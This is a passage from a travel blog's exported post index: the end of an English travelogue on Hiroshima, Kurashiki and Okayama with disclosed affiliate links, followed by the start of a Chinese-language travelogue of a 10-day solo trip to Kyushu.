refreshing, and the portion is quite generous, so a small size would suffice.After eating, I prepared to head back to the station. On the way, I also bought “Fukuzumi Fried Red Bean Cakes,” which were a bit too sweet and oily, tasting quite ordinary. Additionally, I picked up some navy coffee and curry as souvenirs (the staff at subarucoffee_store were very friendly and enthusiastic).I walked back to Kure Station and took the train back to Hiroshima.After returning to Hiroshima, I embarked on my final tour of the city. Right outside Hiroshima Station, there are three routes of sightseeing buses available (included in the JR Pass), allowing you to choose based on your desired direction.I decided to visit Shukkeien (Hiroshima Art Museum) first, so I took the red maple leaf bus.ShukkeienShukkeien is located right behind the Hiroshima Art Museum, and you can purchase a combined ticket for both Shukkeien and the museum.Shukkeien is a quaint little garden featuring many miniature landscapes, such as maple trees, small bridges, flowing water, bamboo groves, and hills. It’s quite nice to stroll around and enjoy the scenery.Hiroshima CastleNext, I strolled to Hiroshima Castle. The original Hiroshima Castle was destroyed in the atomic bombing, and the current structure is a reconstruction. It looks quite new, but it’s not very tall, and the view from the keep isn’t particularly impressive.Hiroshima Peace Memorial Museum and Peace Memorial ParkFinally, I returned to the Hiroshima Peace Memorial Park, right next to the Children’s Peace Monument (I didn’t go inside as it’s not very tall).I happened to encounter Shingo Katori paying his respects in the afternoon.I queued to buy a ticket to visit the Hiroshima Peace Memorial Museum, which has a wealth of information about the atomic bombing, its history, and various artifacts and photographs. The overall experience was very heavy and impactful.On the other side of the park, there’s a memorial hall, but it felt too heavy, so I didn’t go in.As evening fell, a light drizzle began, and combined with the somber feelings from just witnessing the painful lessons of history, I returned to Hiroshima Station.I casually bought some souvenirs and takeout bento at the station before heading back to the hotel to rest. I still need to do laundry today.At APA, the president is truly everywhere—president curry, president water, president’s books…The room density is as usual, with over 60 rooms on each floor.The room is still small but well-equipped, and the electronic facilities are very convenient (you can see the laundry room status from your room, and the TV supports AirPlay).I ran into a big hassle while doing laundry—there was a long line. With over 1,000 rooms in the building and only 7 washing machines, I had to time it just right. I went downstairs to queue when the washing machine was almost done, and finally finished washing and drying my clothes around 11 PM (they weren’t dry yet, so I hung them up in my room).Since it got so late, having a late-night snack was reasonable! I went for a Y1000 meal plus milk and some convenience store hot food.Day 5: Kurashiki, OkayamaThe morning was beautiful and sunny. I checked out of the hotel and said goodbye to Hiroshima, heading to the hotel in Kurashiki to drop off my luggage (I could also leave it in Okayama since I had to go through Okayama to get to Kurashiki).Kurashiki Bikan Historical Quarter, Achi ShrineMy first stop was Achi Shrine, which is situated at a higher elevation and offers a panoramic view of the entire Kurashiki area. It was quite serene with not many people around.Achi Shrine is small but famous for its ema (votive tablets) pavilion. If you draw a bad fortune, you can tie it under the corresponding animal head based on your zodiac sign. They also have a charm for good relationships called Hanachandori:Hanachandori, thanks to Angie for the information.The Bikan area is not large but very tranquil and pleasant to stroll around. Unfortunately, the boat tours were sold out for the day, so I missed that experience, but walking around the nearby alleys was still enjoyable.For lunch, I had a famous curry set at Miyake Shoten. The rich curry paired with burdock strips was delicious.After eating, I continued to explore. When I got tired, I went to Parlor Fruit Komachi (the unique feature is that the staff wear Taisho-era maid outfits) for a fruit sundae with Okayama’s famous “Seiou” grapes and fruit ice cream. The grapes were incredibly sweet.For souvenirs, I found GOHOBI, a collagen jelly made from Okayama fruits.Okayama Korakuen Light Up, Okayama CastleAs the sun set, I took the train back to Okayama Station. Upon exiting, I hopped on a streetcar that took me to the area around Okayama Castle.First, I visited Okayama Korakuen, which looked incredibly romantic and beautiful with its evening lights. Okayama Korakuen and Okayama Castle have a light-up event every year in mid to late November.I then headed to Okayama Castle next door to enjoy the night view, which was beautifully illuminated by the lights reflecting off the autumn leaves.For dinner, I opted for a quick meal at Ippudo Ramen and then took a leisurely stroll back to Okayama Station (the path was also lit up beautifully). I still had some time before heading back to Kurashiki, so I stopped by a discount store (Don Quijote), but they didn’t have many souvenirs. I realized I needed to go to Okayama Station or a department store to find more souvenirs…By the time I returned to Kurashiki, it was already evening, and the weather was cold. People on the street were hurrying home, and the outlet mall behind Kurashiki Station was already closed.I then realized that this hotel doesn’t have a 24-hour front desk, but thankfully I didn’t return too late! The room was well-equipped, with a microwave, kettle, and even a glasses cleaning machine.On my last night in Japan, I simply had convenience store chicken nuggets for Y1000 and bought an extra bottle of white peach strawberry milk as a late-night snack before drifting off to sleep.Day 6: Okayama, Return TripEarly in the morning, just as dawn broke, I checked out and headed to Okayama. I planned to take the airport shuttle from Okayama. There is also a direct bus from Kurashiki to Okayama Airport, but the frequency is lower ( for details, please refer to the official website ). Since I hadn’t finished exploring Okayama yesterday, I decided to head straight there before returning.Kibitsu ShrineAfter getting off the train, I headed straight to Kibitsu Shrine (about a 30-minute ride). After getting off the train, it takes about another 15 minutes to walk there. The shrine features a historic cypress wood corridor, ginkgo trees, and historical buildings, making it a pleasant place to visit.There is also another shrine, Kibitsuhiko Shrine, located on the other side of the mountain, which can be visited along the way, but due to time constraints, I skipped it this time.Okayama AEONAfter returning to Okayama Station, I went to the nearby AEON department store to buy some souvenirs, do some shopping, and have a lunch of tempura soba before preparing to queue for the airport shuttle back to Okayama Airport. There were many people waiting for the shuttle, but there’s no need to worry about not getting on, as they will add extra trips to ensure everyone gets to the airport.Okayama Momotaro Airport (OKJ)The airport is a bit dated and small, similar to Kumamoto Airport. I completed security checks, check-in, and immigration by around 13:50, with nearly two hours left before my flight at 15:25.The airport has very few flights, and since there were only people on the same flight, I finished check-in and baggage drop in less than 15 minutes. Interestingly, Okayama Airport is so small that the X-ray machine is located in the airport lobby. After passing through the X-ray, you get a seal before going to check-in (if you open your luggage, you will be asked to go through security again).After dropping off my luggage, I wandered around the terminal (there are only two floors). There is an observation deck, a café, and a few restaurants to eat at. When I got tired, I bought a white peach ice cream to enjoy.Security checks were also quick, but if you’re wearing boots at Okayama Airport, you need to take them off for security, which is a bit inconvenient.I encountered a flight delay and waited in the departure lounge until 16:24 when we finally took off (almost an hour late). Goodbye, Okayama, goodbye, Hiroshima.Souvenir UnboxingInterludeAfter my previous trip, “10-Day Solo Trip in Kyushu 2023,” I experienced an indescribable sense of loneliness in the following days. It was partly due to being alone in an unfamiliar place and not speaking Japanese for 10 days, which meant I hardly talked to anyone. That feeling of loneliness is still fresh in my memory, so I wasn’t particularly eager to travel again. However, I ended up going because I had to work soon and found an incredibly cheap flight.On the first day, while exchanging my JR Pass, I happened to get stuck and met a group of fellow Taiwanese travelers who were also stuck. We took turns trying to figure it out until we succeeded. Coincidentally, one of them was also heading to Hiroshima, and she reminded me when I got stuck at the entrance. We all ended up on the same train, and since we were in the same industry, we had plenty to talk about. We were all traveling alone, so we ended up forming a group and completing the same itinerary together on the first day. Many of the itineraries, attractions, and time arrangements were provided by Angie. If I had been on my own, I might have wandered aimlessly or missed out on things, and then I would have ended up walking alone for six days.KKday Promotions 🛒 [Japan JR PASS Tottori &amp; Matsue Area Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/153331){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} Japan JR PASS | Sanyo &amp; Sanin Area Rail Pass | eMCO Electronic Ticket (Explore the Sanyo and Sanin regions all at once) [Japan JR PASS Kansai &amp; Hiroshima Area Rail Pass eMCO Electronic Ticket](https://www.kkday.com/zh-tw/product/20310-jr-west-kansai-hiroshima-area-pass-e-mco-voucher-japan?cid=19365&amp;ud1=31b9b3a63abc){:target=”_blank”} Atomic Bomb Dome Ticket (Hiroshima City, Hiroshima Prefecture) [Miyajima Momijidani Park, Daishoin Temple, Itsukushima Shrine Rickshaw Experience](https://www.kkday.com/zh-tw/product/22395-miyajima-private-tour-ebisuya-rickshaw-experience?cid=19365&amp;ud1=31b9b3a63abc){:target=”_blank”} Hiroshima and Miyajima One-Day Bus Tour If you found this article helpful, feel free to use my promotional link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you!More Travelogues [Travelogue] 2024 San’in Region: Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu: 9-Day Free Trip via Busan → Hakata Cruise Entry [Travelogue] 2023 Kyushu: 10-Day Solo Free Trip [Travelogue] 9/11 Nagoya One-Day Flash Tour [Travelogue] 2023 Tokyo: 5-Day Free Trip [Travelogue] 2023 Keihanshin: 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 13,331 Total Views Last Statistics Date: 2025-08-15 | 13,298 Views on Medium." }, { "title": "遊記 2023 九州 10 日自由行獨旅", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2023-%E4%B9%9D%E5%B7%9E-10-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C%E7%8D%A8%E6%97%85-d78e0b15a08a/", "categories": "Z 度旅行遊記", "tags": "生活, japan, kyushu, fukuoka, kumamoto", "date": "2023-10-04 12:46:37 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 九州 10 日自由行獨旅九州 10 日自由行 福岡、長崎、熊本 走馬看花紀錄[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2023 九州 10 日自由行獨旅九州 10 日自由行 福岡、長崎、熊本 走馬看花紀錄[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保前言8 月底正式離開待了快 3 年的 Pinkoi；原本就有想離開的念頭，上半年時想說把假期放一放，去外面透透氣，回來再看情況，於是和朋友去了「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」和同事去了「 [遊記] 2023 東京&amp; 🇯🇵二次著陸 」；但回來之後反而更想真正跳脫，剛好手上的事也告一段落，就鼓起勇氣跨了出去，離開舒適圈，尋找下一個新挑戰！「 [遊記] 9/11 名古屋一日快閃 」純屬意外，如文內所說比較像行軍而不是放鬆的旅行。趁著難得的空檔再去探索一次日本，原本的計畫是找同樣在待業的朋友一起去 🇰🇷 釜山 ➡️ 🇯🇵 福岡 ➡️ 🇯🇵 熊本 的路線 ；韓國去熊本回，途中釜山到福岡可以搭乘 新山茶花號 ，睡一晚 12 小時就到福岡，等於通勤＋住宿全包。朋友 9 月就找到工作去上班了，一時之間也找不到新旅伴；一個人去不太想要大範圍移動，所以先捨棄了🇰🇷 釜山 ➡️ 🇯🇵 福岡 段，改成 🇯🇵 福岡 ➡️ 🇯🇵 熊本，福岡進熊本回的路線。10 月開始時間都很零散也想說 10 月要開始準備找新工作，所以出發日就訂在 9 月底 (9/17–9/26)。總結 / Retro一樣把總結、檢討寫在前面，在自由行社團看到一段話很喜歡：「自由行就是不斷地繳學費(花時間或金錢)學習，經驗多了會踩的坑也越來越少」。👍 生可樂、蜜桃水、全家的果汁飲料、秋雅梅酒，好喝！ 日本職棒值得一看！買票記得買整排空或是靠走道的位子、便宜的位子就好 JR Pass 不一定省，但在九州真的有省到！至少省了 1,000 多台幣 獨旅也遇到很多有趣的事；例如途中幫助了日本家庭獲得三原市的伴手禮、好心的外國姊姊主動幫拍照、一起游船的路人台灣家庭、一起走完阿蘇的台積電大哥、在熊本幫忙路人家庭拍照結果又在機場遇到又再幫他們拍一次…等等 九州(不只熊本)到處都有熊本熊部長的蹤跡 整個九州都很空曠，都沒什麼人，名店吃的、景點幾乎不用排隊，很舒服 日文稍微進步一點，聽得懂數字(雖然還是要先用 Google 翻譯確認沒唸錯)、聽得懂要不要塑膠袋；知道結帳、這個、以上就好、現金、信用卡、免稅的祈使句(XXX お願いします) 完成遊記撰寫！👎 這次住到雷：日本找飯店也還是要看評價，最好直接看低分評價的內容，看能不能接受、再打開街景實際走看看好不好走 這次熊本排太多天，應該 2 天就好，其他天可以去大分；而且福岡熊本其實比福岡長崎還近很多：以往都是先找住宿再找景點，九州幅員遼闊；應該要先找想去的地方再來排住宿，能去的景點會更多 福岡住宿的選擇、價格、品質都比熊本好太多 這次錯過了由布院的祭典(那天我跑去長崎)：之後可以查查去的日期有沒有祭典，大家都推祭典，一定要去 JR Pass 可以搭新幹線，但「希望(Nozomi)號」、「瑞穗(Mizuho)號」不行；搭了要補票 獨旅+語言不通其實蠻孤單的，更多時候是自我沉靜享受孤獨 獨旅找住的比較貴 這次依然狂走景點，應該放慢腳步慢慢享受當下跟尋找美食；尤其日本過吃飯時間就沒有有名的店吃了 這季節九州的太陽還是很曬，要做好防曬 北長崎普普(荷蘭、中華街)，南長崎跟夜景比較有特色KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應）準備工作行最一開始考慮 福岡進福岡出，熊本一兩日來回(後面證明這才是對的ＸＤ，熊本景點不多不用待太多天)；查到華航有一班福岡進熊本回的班機，還便宜 $1,000，就決定是此航班了。因為時間相當充裕就找了最奢侈的中午出發中午回的時間，包含飛機時間一共 10 天。 去程：9/17 CI 116 16:40 TPE -&gt; 20:00 FUK 回程：9/26 CI 2195 ( 9/26 新開航 ) 12:30 KMJ -&gt; 13:34 TPE價格： $10,048因為九州幅員遼闊，這次有買 JR Pass 北九州鐵路周遊券 (5 日)，想說怎麼坐都還是賺。住 (9 晚)安排的時候沒想太多也沒查資料，想說福岡、熊本都沒去過；就抓個一半一半 5天:4天 住。福岡 5 晚— 福岡天神本尼卡卡爾頓飯店 ( Benikea Calton Hotel Fukuoka Tenjin ) 價格：$7,583，$1,516/晚 交通：從博多站出發，可以搭地鐵七隈線到渡邊通站或搭公車走 5 分鐘到達熊本 4 晚 — Green Rich飯店 — 水前寺 ( Green Rich Hotel Suizenji )JR 熊本 -&gt; 飯店飯店 -&gt; 熊本機場熊本住宿很難找(不知道是不是都被台積電出差訂走的關係)，選擇少、價格比福岡貴、老舊；最後只找到這家，價格相對便宜的飯店。 價格：$8,157，$2,039/晚 交通：JR 熊本站出來改搭豐肥本線在搭路面電車出來就到了(市立體育館前站)， 回程去機場的交通也很方便，出來就有機場直達車到熊本機場飯店訂好了，就可以填寫線上的 預定入境申請 。樂原本的計畫如下： 9/17 21:00 到福岡 22:00 到飯店，應該就外面屋台逛逛 9/18 長崎 (新地中華街/荷蘭坂/哥拉巴園/大浦天主堂/Gunkanjima Digital Museum/眼鏡橋)不會都去+ 原爆資料館＋和平公園 + 晚上稻佐山山頂展望台 看夜景 9/19 柳川、太宰府一日遊 + LaLaport 福岡(optional) 9/20 門司港、小倉城一日遊 + 屋台 9/21 博多逛街 (福岡塔、神社、運河城、天神地下街…) 9/22 博多逛街＋移動到熊本+ 水前寺成趣園 9/23 熊本市區、熊本城、熊本熊部長參見 9/24 阿蘇火山一日遊 9/25 島原城、島原三柴犬 (很遠，考慮) 9/26 10:00 熊本機場 12:30 起飛回程Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。這次也是非常衝動，9/10 買好機票+訂好房，9/15 計劃好行程，9/17 出發！Day 1 出發下午 16:40 的班機，有很充裕的時間慢慢起床、慢慢出門。到達機捷 A1 台北車站後，一樣選擇預辦登機，直接在北車完成報到＆掛行李，到機場就直接走出境，不用跟人擠櫃檯排隊 ( 預辦登機資訊請參考官方網站 )。這次也在托運行李放 Airtag 追蹤行李位置，不怕行李遺失、等轉盤的時候也很方便。約莫 13:00 抵達機場，直接出境亂晃。隨便吃了很貴又普通的口水雞，順手看了一下行李位置；行李也跟隨我托運到機場了。吃飽之後大概才 14:30，隨手買一本日語書臨時抱佛腳。遇到其他飛機跑錯跑道，整個機場 Reset；飛機繞了一大圈才起飛，大概 Delay 了快 30 分鐘；坐到老飛機電視超小。華航攜手五桐號 打造空中最萌甜點 ，是 Dinotaeng 的超萌短尾袋鼠，桂花烏龍也蠻好喝的。因飛機延誤大約 21:00 才出機場。出機場後可以看到一個指示牌，告知要去的方向＆在哪個站牌等車；除了到博多也能到其他地方，可參考 此篇文章 或 官網 ；如果要去遠的地方記得查好班次。本來預計要搭的是 2 號直達博多站，但 2 號好像末班還是要再等一個小時(我忘了)，就改搭 1 號到福岡空港國內線(地下鐵福岡機場站)，再搭地鐵到博多再轉地下鐵七隈線到渡邊通站。Hello Fukuoka!第二張照片的左邊就是要入住的飯店。飯店小開箱，整體偏舊、燈光昏暗、隔音普普、冷氣稍微有聲音，但依然乾淨整潔；不過還是有點小後悔為什麼不多加一些錢住同樣在附近的 APA 連鎖飯店。原本預計第一晚就去屋台逛逛，因爲太累就改超商隨便吃一吃，早點休息準備明天的行程。Day 2 長崎一早從床外看福岡市區的景觀。博多車站搭地鐵到博多太繞，直接走路到渡邊通搭公車到博多比較快。到博多後先去人工櫃檯兌換 JR Pass (出示護照)並預約前往長崎的位子，兌換 JR Pass 的外國人很多，大概排了快一小時才排到，建議提早出門或提前去換。 JR 九州 Pass 目前還是只能人工櫃檯兌換，請提早去排隊兌換，如果博多站太多人可以 考慮去附近的其他車站兌換，會比較快！ 我是買五日券，從換的那天開始算五日，進出車站都用有本券(有日期＆金額那張)，劃位的指定券只是讓你知道座位在哪而已，不能用來進出車站；本券要收好，這五天都會用到，遺失就沒了！博多到長崎有兩段，會先到武雄溫泉再從武雄溫泉換車往長崎；在同一個月台換車，車次時間他們都有算好，基本上到站後直接往對面走上車就是。候車的時候發現九州的火車都好有特色！！位子很大很舒服，靠窗可以看風景。車程時間約：1 小時 50 分小插曲：完成一次國民外交 ✅ 搭乘時隔壁坐一組家庭，爸爸媽媽帶兩個小孩出去玩，小孩坐車到一半突然吐，看爸爸一時沒有衛生紙只能直接拿報紙擦，就順手拿衛生紙跟濕紙巾給他。 要下車的時候，爸爸給了我一個 三原市お土産 (蝦子米餅)。長崎車站出長崎車站後天氣大好！本來還擔心今天會下雨。出站後往長崎路面電車方向搭乘。長崎(南邊)第一站先往南到長崎新地中華街逛逛。對外國人可能是蠻特殊的景點，但對華人還好，裡面有賣長崎特色刮包、長皿烏龍、強棒麵、小籠包…不過當時沒什麼胃口，所以只路過逛逛就走了。一路往哥拉巴園走，還有經過孔廟ＸＤ經過荷蘭坡(就是個斜坡)，然後搭乘電扶梯往上到哥拉巴園 2 號入口，整個地形就是個面海的大山坡地。入園哥拉巴園走馬看花，建築風格、內部裝飾；很像淡水紅毛城(因為同樣都是荷蘭人建立的)最後別忘了去兌換免費的寫真照片，從這也能瞭望長崎港的郵輪。下山的途中就會經過大浦天主教教堂，沒進去，拍個照就離開了。買了長崎的刮包吃看看，我覺得還是台灣的好吃！回程往北到長崎原爆資料館的途中先到眼鏡橋下車拍照，從正面看水中的倒影真的蠻美的，有時間的話直得一拍。長崎(北邊)參觀原爆資料館更多的感受是沈浸與反思，場館設計了很多場景(爆炸當時的或讓人沈浸的)、裝置藝術、歷史資料、採訪；讓參觀者能沈浸在當時的歷史氛圍跟反思日後的戰爭的殘酷可怕。出資料館後往前走就是原子彈爆炸點，和平公園。路上(包括原爆資料館)都懸掛很多彩色紙鶴象徵祈求和平。稻佐山夜景離開和平公園後先去客美多稍做休息，準備晚上去看 世界三大夜景之一的稻佐山夜景。查公車出客美多走一小段有公車站到稻佐山下纜車搭乘處(淵神社駅)，就漫步到車站等車。結果被公車誤點雷了，這小站沒有電子看板，Google Map 又寫已離站但又沒看到車；等了 5 分多鐘想說該不會今天沒發車，就趕快再查附近別的站牌有到淵神社的，然後又再走 10 分鐘到另一個站牌搭另一班車才到。 好笑的是走到一半發現那班誤點的車來了。。。但也來不及了 Orz下車後對面就是淵神神社，直接往上走穿過幼兒園之後就是長崎纜車(淵神社駅)，因為沒有要待到太晚所以就直接買來回票(比較便宜，但如果要到太晚會沒纜車，只能搭公車回去)。有點烏來-&gt;雲仙樂園的 Fu。下纜車後，還有另一個遊山看景的纜車可以搭，但我沒嘗試，所以直接一路往觀景台方向走。忘了拍觀景台的照片，是一座 360 度的塔，可以環繞看整個長崎市區、港口、山的景色，而且無需門票；可以從西邊太陽從港口落下開始看，到東邊晚上的市區夜景。觀景台很大，不怕人多。日落後就能看到整個長崎市區、車站的夜景，很美。最後看一眼長崎車站的夜景、買個長崎蛋糕伴手禮(後來發現博多就有賣、保存期限約 12 天，應該後面再買就好…)，準備回博多了。再次遇到誤點，這次是 JR (信號故障)；大概延誤快一小時才到博多(已累攤)，司機開很快感覺很晃。買個宵夜回飯店休息。Day 2 柳川太宰府一日遊 + LalaPort 福岡早上先到 福岡（天神）遊客中心買一日套票 ( 福岡天神、藥院或線上購票都可 )，可以自己算一下有沒有比較便宜。 KKday 【九州票券】太宰府柳川暢遊套票（桃園機場取件）西鐵 — 一日暢遊「古都太宰府」與「水鄉柳川」兩大景點。另外會送兩本 Coupon， 太宰府那本有一張可以兌換免費的梅枝餅 。順序沒有一定，但遊船有時間限制，下午 2 點之後就沒了；所以就直接照流程走，福岡-&gt;柳川-&gt;太宰府-&gt;福岡。買完票後走人工窗口，給站員看票後就能進車站直接搭車(不用劃位)前往柳川。車程時間：約 1 小時 10 分柳川遊船出站後會看到穿著白色背心的工作人員(如果沒有旁邊有服務中心可以問) 會給你地圖+回程方式+時刻表 &amp; 直接引導你去搭接駁車到乘船場。出站同樣走人工剪票，站員會撕掉福岡往柳川站的票。本來看路程想說可以用走的，但出站就看到有工作人員直接用心引導，所幸就搭乘巴士了。到達乘船處等下一班船時剛好遇到前面是台灣人家族旅行，就地與他們抱團，一路閒聊(畢竟我獨旅又不會日文ＸＤ來九州幾乎沒跟人講話)。水非常乾淨，這個季節綠油油的比較沒那麼美，但相對人也少。船夫會一路介紹經過的景點、唱唱歌(台灣人多半會聽過，很多老歌)。過橋的時候船夫會請大家低頭防止撞到，蠻有趣的；路途上遮陰不多，有點曬。中間會經過一家冰店，賣水果冰的，可以買一個消消暑；船夫也會發給每個人冰袋降降溫(很貼心)。一路與前面抱團的台灣家族的爸爸閒聊，最後還獲得一張名片。下船後沒找到免費接駁車位子，還排錯隊排到其他的(非西鐵套票)接駁車被拒絕搭乘；要研究一下地圖上的乘車點 (川流船場（沖之端）)或直接詢問比較快。我後來是走去搭公車，回西鐵柳川站。太宰府柳川往太宰府要在二日市車站換乘往太宰府的列車(要到另一個月台)。車程時間：約 1 小時搭乘旅人號到太宰府，經 五條 (2.5 條悟QQ)；有點類似北投到新北投，就一班列車來回開。中間有一節車廂有展示太宰府的文物跟可以寫明信片，可以去看看。太宰府站也很美，外面的 Lawson 也很有日本的 Fu。出站右手邊就是全球唯一的五角(日文合格)碗一蘭拉麵。吃完拉麵後來個梅枝餅，跟梅子沒太大關係，比較像紅豆烤年糕，要吃現做的皮才會是蘇的，好吃！我忘了用西鐵套票送的退換券換，花 150 日圓自己買了一個；看保存期限只有一天，無法帶回台灣。表參道繼續往太宰府走就會經過日本最美之一的星巴克，空間蠻大但人也多，沒有駐足就離開了。通往神社的橋如果是晚上＋人少應該蠻好拍的，人太多隨手亂拍。參拜完後回到太宰府站，往回去福岡 Lalaport。福岡 Lalaport一樣從太宰府站先回到二日市再轉搭往博多方向的列車，在 大橋（福岡）下車，出站往左邊乘車處找到 Lalaport 直達車，跳上去一站就到 福岡 Lalaport 了。總車程時間約：50 分一來就看到外面巨大的福岡鋼彈。Lalaport 很大，很好逛也適合親子；樓上還有個大操場，有小朋友在玩也有人躺著休息。樓上有 Jump Shop 賣少年 Jump 週刊的相關周邊，有排球少年、航海王、獵人、咒術回戰、鏈鋸人…等等，買了些咒術的周邊。滿 5000 日圓一樣可以退稅，但好像是退到他的 App 還什麼的，有點複雜，而且吃的不含在內。去美食街吃宮崎牛丼飯，要走的時候買了些宵夜回去(咖哩麵包、如水庵大福)。晚上發光的鋼彈還是蠻震撼的。回程直達公車，不是在原本下車的地方搭車，照館內指示牌直接從館內的巴士站搭乘即可。回飯店休息，自配平板(電視太舊沒有智慧功能)；咖哩麵包酥脆好吃，裡面還有肉餡、大福還不錯，不過我比較喜歡 弁才天 的。Day 3 門司港、小倉城、博多運河城、中洲屋台一早同樣先到博多站，搭乘 JR 往門司港，再回來小倉城。博多小倉交通小插曲 沒特別看 Google Map 的規劃，搭到 JR Pass 不能搭的新幹線 希望號 20 ；出站時逼逼逼出不去，經站員引導補票 2,160 日圓才完成出站，不過快也是真的快，這班 15 分鐘就到門司港。門司港有驚無險(想說會不會被罰錢)的來到門司港。出站往前走就是門司港，平日來完全沒人；剛好遇到藍翼門司吊橋要放下。放下後可往後走到後面的觀景塔，鳥瞰整個門司港。塔出來剛好走一圈門司港。午餐就吃門司港有名的咖哩燒。小倉城門司到小倉很近，但小倉是小站，出站一片荒蕪，找小倉的入口還走錯繞了一大圈，其實入口就在小倉外面的 Mall 那側。小倉城小小的不大，裏面參觀的項目蠻多的，只是天守閣的景很普通(正面看出去就是那個 Mall)。參觀完後就回車站搭車回博多了，乖乖搭 JR，但是小站只有區間車花了一個多小時慢慢回去。博多運河城回博多時時間還早，就去博多運河城、市區晃晃。沒特別查，本來以為是什麼「城」或什麼「護城河」之類，結果是百貨公司ＸＤ，真的有「護城河」而且有水舞表演。這邊要逛也很多可以逛，也有 Jump Shop。時間還很早就亂走，走出去吃 博多祇園鐵鍋煎餃 。皮酥酥脆脆裡面有湯汁，很好吃；因為語言不通，店員阿姨還很可愛比手畫腳比大肚子 2 份（1 份只有 8 顆，2 份 16 顆才吃得飽）當時沒有意會過來，所以還是只點一份＋博多有名的名太子。中洲屋台吃完，天還沒黑先漫步道中洲屋台逛逛。時間還很早就先走去逛天神的百貨 (Parco) 等天黑再回來看夜景。樓上有 Animate、扭蛋首抽就中五條悟。夜景的中洲屋台給人一種煙火氣感。浮誇顯眼的日式廣告招牌。中洲屋台就是這一側的路邊食堂，人聲鼎沸；有拉麵、關東煮、燒烤，沒有特別吸引我，就沒進去吃了。回飯店喝酒吃宵夜休息。Day 4 住吉神社、櫛田神社、天神地下街、福岡塔、福岡軟銀鷹隊棒球比賽一日福岡步行，出飯店後先走到附近的住吉神社。住吉神社小小的，不是在附近應該不會特地去。再次經過博多運河城前往櫛田神社。路上看到屋台餐車早上停放的地方，好小巧可愛。櫛田神社櫛田神社比較大，也抽了支籤，看到求職「會突然成功」好像對工作又看到了希望呢。有展示博多祇園祭的神轎，很巨大壯觀。繼續漫步福岡，中午走到 ハカタミヤチク (日本一宮崎牛専門店 博多みやちく) 品嚐宮崎牛。這樣一份宮崎牛排＋啤酒大約台幣 $650 上下，好吃又便宜！宮崎牛 Juice 且沒什麼異味。天神地下街吃完午餐就去天神一代、天神地下街亂逛，順便買伴手禮小雞餅乾、蛋糕；也去超市買了串很紅的麝香無籽葡萄嚐嚐。在天神亂晃，發現野生的熊本熊部長。先回飯店放買的伴手禮＋休息片刻後出發前往福岡塔＋看棒球賽。福岡塔從市區搭公車前往福岡塔。 KKday 日本・九州｜福岡塔 Fukuoka Tower 入場券福岡塔全鏡面設計，從外面看很美，我覺得比晴空塔還美！(感謝路人姊姊幫拍照)但因為塔蓋在城市的最外側靠海的地方，上面景色普普；不確定晚上夜景如何。出福岡塔後慢慢走到上一站就是 福岡 PayPay 棒球場，是海的味道。福岡軟銀鷹隊棒球比賽人很多(大概坐滿 7 成)，但是現場買還有票。買票小插曲買票的時候遇到阿伯櫃檯，看到外國人語言不通緊張的手在抖；我也跟著緊張ＸＤ；一時腦霧，選了前面看台的最後一排最中間的指定席位子（左右坐滿人）結果進去超尷尬，進出都要一路 すみません，而且位子也很小，擠在日本人中間，我一句日文也不會，很尷尬。。。正經危坐的看完整場球賽。票價快 $1,500 台幣，想想應該買個最便宜的爛座位自己輕鬆看就好。不得不說巨蛋的視覺效果(離球場很近)、整個大型的螢幕動畫顯示都很好。福岡軟銀鷹隊的加油應援傳統，7 局上大家會灌氣球(用手動打氣桿) 然後釋放出去，至於垃圾…就不管了最後會有人清。最後主場 4:2 獲得勝利，比中職精彩，投手球速都在 145km 上下，局局有攻防，很少三上三下；但打的節奏又很快，看起來很舒服。不過啦啦隊的部分，台灣還是比日本豐富的。主場獲勝會在大巨蛋內放煙火，很酷！！買了條軟銀鷹的毛巾做為到此一遊的紀念，也一解 上次去阪神虎甲子園棒球場票售罄不得其門而入的窘境 。散場的人非常多，但大家不會站太近也都慢慢走，就跟著大家一路走到最近的地下鐵唐人街町站，因為公車感覺要排很久。回飯店休息順便嚐嚐下午買的麝香無籽葡萄嚐嚐，很甜、有點甜過頭。Day 5 熊本 (熊本城、鶴屋百貨)一早先 Chekout 走到飯店附近的藥院晃晃發現沒什麼，吃個麥當勞(滿福堡加蛋配冰美式這樣才 $107)就回來拿行李準備搭 JR 去熊本了。最後跟這間飯店說再見了，Lobby 有福岡軟銀鷹隊的娃娃、外面有掛 🇹🇼 國旗也蠻猛的，因為隔壁就是中國人開的友誼超商，很多中國人。福岡博多 -&gt; 